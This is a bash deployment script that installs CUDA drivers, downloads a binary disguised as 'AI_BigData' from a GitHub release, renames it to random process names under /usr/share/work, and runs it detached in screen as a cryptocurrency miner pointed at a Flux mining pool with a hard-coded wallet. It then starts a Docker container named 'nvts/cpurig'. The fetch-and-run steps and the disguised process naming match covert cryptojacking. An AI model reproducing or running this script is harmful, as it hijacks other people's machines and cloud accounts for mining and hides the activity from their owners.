#!/bin/bash
apt-get update && apt-get install -y docker.io screen
apt-get install -y git wget
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
ls /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/11.2.2/local_installers/cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
sudo apt-key add /var/cuda-repo-ubuntu1804-11-2-local/7fa2af80.pub
rm -f cuda-repo-ubuntu1804-11-2-local_11.2.2-460.32.03-1_amd64.deb
sudo apt-get update
sudo apt-get install -y cuda-drivers
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
mv AI_BigData $azure -n
cp $azure "$cpuname"
rm -f  AI_BigData
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --user t1SzPN5ZrAccHeSGPcxwzuwL9Qk54GUzEJi.bbzz --ssl --server eu-flux.fluxpools.net --port 7003 --pass wow --algo 125_4 --pers ZelProof


#!/bin/bash
docker rm -f cpudataissa
docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
